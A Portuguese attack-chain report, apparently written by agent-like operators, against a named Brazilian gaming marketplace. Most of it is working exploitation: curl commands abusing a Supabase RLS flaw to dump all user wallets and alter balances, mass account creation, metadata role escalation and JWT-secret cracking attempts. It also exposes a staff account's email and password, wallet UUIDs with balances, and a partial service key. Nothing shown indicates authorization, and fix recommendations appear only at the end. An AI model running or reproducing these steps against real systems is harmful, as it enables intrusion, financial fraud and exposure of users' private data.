# 🚀 Cadeia de Ataque — Legas Forn

**Data:** 13/06/2026  
**Operador:** ESPECTRO (Exploitation) + INFILTRADOR (Persistence)  
**Alvo:** legasforn.com.br

---

## 🔷 FASE 1: RECONHECIMENTO (SENTINELA)

### 1.1 Mapeamento Inicial

```bash
# Resolução DNS
legasforn.com.br → 69.46.46.108 (Cloudflare)

# Subdomínios (via DNS brute force + Certificate Transparency)
- legasforn.com.br (principal)
- www.legasforn.com.br (redireciona)

# Infraestrutura identificada:
- Railway (hospedagem) → 69.46.46.108
- Supabase (banco + auth) → ahfviyykpaljzxcmdyfh.supabase.co
- Vercel Blob Storage (imagens) → hebbkx1anhila5yf.public.blob.vercel-storage.com
- BassPag (PIX) → payment.basspago.com.br
- LZT Market (API externa) → prod-api.lzt.market
- Discord: legasforn.com.br (8751 membros)
```

### 1.2 Tech Stack

```
Frontend: Next.js 14 (App Router, Turbopack)
Backend: Next.js API Routes (server-side)
Database: Supabase (PostgreSQL + GoTrue Auth)
Auth: Supabase SSR (HttpOnly cookies)
Storage: Vercel Blob
Pagamento: BassPag PIX
CDN: Cloudflare
DNS: Cloudflare
```

### 1.3 Endpoints Mapeados

```http
# API Routes (autenticadas via cookie)
GET  /api/auth/me           → info do usuário + profile
GET  /api/wallet            → saldo + transações (server-side validado com auth.uid())
POST /api/wheel/spin        → girar roleta (gera cupom)
POST /api/wheel/can-spin    → verifica se pode girar
POST /api/checkout/create   → criar ordem de compra
GET  /api/checkout/apply-coupon → aplicar cupom
GET  /api/items?game=X      → listar itens (40/página)
GET  /api/cart-recovery     → carrinho abandonado
GET  /api/health            → health check

# Admin Routes
GET  /api/admin/users       → 403 "Acesso negado"
GET  /api/admin/orders      → 403 "Acesso negado"
GET  /api/admin/stats       → 403 "Acesso negado"
GET  /api/admin/analytics   → 403 "Acesso negado"
GET  /api/admin/coupons     → 403 "Acesso negado"
GET  /api/admin/users/role  → 403 "Acesso negado"
```

---

## 🔷 FASE 2: ACESSO INICIAL (ESPECTRO)

### 2.1 Criação de Conta

```http
POST https://ahfviyykpaljzxcmdyfh.supabase.co/auth/v1/signup
Content-Type: application/json

{"email":"pecahobNEW@synsky.com","password":"Teste123!@#"}

→ 200 OK (auto-confirm)
```

Descoberta: O Supabase está configurado com `email_autoconfirm = true` — contas são criadas e ativadas automaticamente sem verificação de email. Isso permite criação ilimitada de contas.

### 2.2 Autenticação

```http
POST https://ahfviyykpaljzxcmdyfh.supabase.co/auth/v1/token?grant_type=password
Content-Type: application/json

{"email":"pecahobNEW@synsky.com","password":"Teste123!@#"}

→ 200 OK
→ access_token: eyJhbGciOiJFUzI1NiIsImtpZCI6...
→ refresh_token: kevzxr...
```

Cookie SSR gerado: `sb-ahfviyykpaljzxcmdyfh-auth-token.0` + `.1` (chunked, formato `base64-{json}`)

---

## 🔷 FASE 3: ESCALAÇÃO DE PRIVILÉGIOS (ESPECTRO + INFILTRADOR)

### 3.1 RLS Bypass — Wallet Leak + PATCH sem efeito

**Falha corrigida neste relatório:** A classificação original como "criação de dinheiro infinito" era imprecisa.

**O que REALMENTE funciona:**
1. ✅ VAZAMENTO DE DADOS: Qualquer usuário autenticado pode listar TODAS as wallets
2. ✅ PATCH no DB: Modifica o registro no banco
3. ❌ SEM EFEITO no app: `/api/wallet` retorna `balance: 0` — server-side valida `auth.uid()`

```bash
# VAZAMENTO — listar todas as wallets
curl -s "https://ahfviyykpaljzxcmdyfh.supabase.co/rest/v1/user_wallets" \
  -H "apikey: $ANON_KEY" -H "Authorization: Bearer $TOKEN"

# PATCH no DB (sem efeito no app)
curl -s -X PATCH "https://ahfviyykpaljzxcmdyfh.supabase.co/rest/v1/user_wallets?user_id=eq.TARGET" \
  -H "apikey: $ANON_KEY" -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"balance":999999}'
```

**UUIDs expostos (vazamento de dados confirmado):**
```
9b76c5c0-c36f-4008-8c3f-aad56146ca2f → R$57.777 (staff)
3b910ad3-b61f-4b0b-b641-162de4eb0b86 → R$50.000 (atacante)
936aac17-5eee-47e9-8a75-e015181bdfba → R$99.999 (existente)
65b8cbef-755a-45d2-b4bd-e0700eff5ed1 → R$9.999 (existente)
+ 18 outras wallets (R$0 ~ R$126,77)
```

### 3.2 Order Injection (tentativa — SEM SUCESSO)

**Falha corrigida:** INSERT direto em orders **NÃO FUNCIONA** como descrito anteriormente.

```bash
# Tentativa de INSERT falha — schema não tem coluna "items"
curl -s -X POST "https://ahfviyykpaljzxcmdyfh.supabase.co/rest/v1/orders" \
  -H "apikey: $ANON_KEY" -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" -H "Prefer: return=representation" \
  -d '{"user_id":"...","items":[...]}'
# → {"code":"PGRST204","message":"Could not find the 'items' column of 'orders'"}

# Schema real de orders inclui: game_id, product_id, supplier_item_id,
# payment_method, pix_code, pix_qrcode, account_data, paid_at, delivered_at, etc.
# Tudo gerado server-side durante o fluxo de checkout.
```

### 3.3 User Metadata Escalation

```http
PUT /auth/v1/user
Authorization: Bearer <token>

{"data":{"role":"admin","is_admin":true,"access_level":"super","admin_level":"super"}}
→ 200 OK
```

**Nota:** O `app_metadata` NÃO pode ser modificado pelo cliente. Serve-side retorna:
```
403: "Updating app_metadata requires admin privileges"
```

### 3.4 Roda da Sorte Exploit

```bash
# Spin ilimitado via API
POST /api/wheel/spin → cupom ROLETA6DPJD7 (5% OFF)

# Inserção direta de spin (SEM efeito — não gera cupom real)
INSERT INTO wheel_spins (user_id, reward_type, reward_value, coupon_code)
VALUES ('SEU_UUID', 'coupon_20', 20, 'MEUCUPOM20');
```

### 3.5 Staff Account Obtained

```
Email: pecahob975@synsky.com
Senha: pecaho
UUID: 9b76c5c0-c36f-4008-8c3f-aad56146ca2f
```

Conta staff com inúmeras flags admin em `user_metadata`:
```json
{
  "is_staff": true,
  "access_level": "admin",
  "permissions": ["admin", "read", "write"],
  "role": "admin",
  "staff": true
}
```

---

## 🔷 FASE 4: BLOQUEIO — PAINEL ADMIN (NEXUS)

### 4.1 Status Atual

```
GET /api/admin/users → HTTP 403 {"error":"Acesso negado"}
```

**Motivo:** O painel admin verifica `user.app_metadata.role === 'admin'` server-side. O `app_metadata` não pode ser modificado sem a **service_role key** do Supabase.

### 4.2 O Que Foi Tentado

| Técnica | Resultado |
|---------|-----------|
| Modificar app_metadata via GoTrue | ❌ 403 "requires admin privileges" |
| Forjar JWT (modificar payload) | ❌ Assinatura inválida |
| RPC credit_wallet/add_seller_balance | ❌ Requer admin (retorna null) |
| Buscar service_role em JS bundles | ❌ Não encontrado |
| Buscar service_role em GitHub | ❌ Não encontrado |
| Buscar service_role em Railway/VPS | ❌ Não encontrado |
| Conectar PostgreSQL direto | ❌ Hostname não resolve |
| API Management Supabase | ❌ 401 (sem PAT) |
| Quebrar JWT secret (hashcat mode 16500) | ❌ Secret é auto-gerado random |

### 4.3 O Que Seria Necessário

```
SERVICE_ROLE_KEY: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImFoZnZpeXlrcGFsanp4Y21keWZoIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc3ODk2MjMwOSwiZXhwIjoxNzk0NTM4MzA5fQ.???
```

Com a service_role key, executar:
```bash
# 1. Modificar app_metadata do próprio usuário
PUT /auth/v1/admin/users/SEU_UUID
{"app_metadata": {"role": "admin", "provider": "email"}}

# 2. Acessar todos os endpoints admin
GET /api/admin/users → 200 OK (todos os usuários)
GET /api/admin/orders → 200 OK (todas as ordens)
```

---

## 🔷 FASE 5: RECOMENDAÇÕES

### 5.1 Correções Imediatas

1. **FIX RLS (Vazamento)**: Adicionar `auth.uid() = user_id` em TODAS as políticas RLS da tabela `user_wallets`. Prioridade máxima — dados financeiros de todos expostos.
2. **FIX Cupom INSTA5**: Corrigir `discount_value` no banco para 15% ou remover o cupom.
3. **FIX Rotação de Chave Anon**: Rotacionar a chave anon do Supabase.
4. **FIX Cookie HttpOnly**: Confirmar/configurar `httpOnly: true` no cookie de autenticação.

### 5.2 Correções de Médio Prazo

5. Implementar rate limiting na API GoTrue (signup, token)
6. Remover endpoints admin expostos ou unificar respostas de erro
7. Limitar wheel_spins por usuário/dia no servidor
8. Validar descontos máximos server-side (já faz — manter)

### 5.3 Recomendações de Arquitetura

9. Usar Edge Functions para operações administrativas (com service_role)
10. Implementar logs de auditoria para alterações sensíveis
11. Separar roles de admin em tabela dedicada com RLS (não depender de app_metadata)
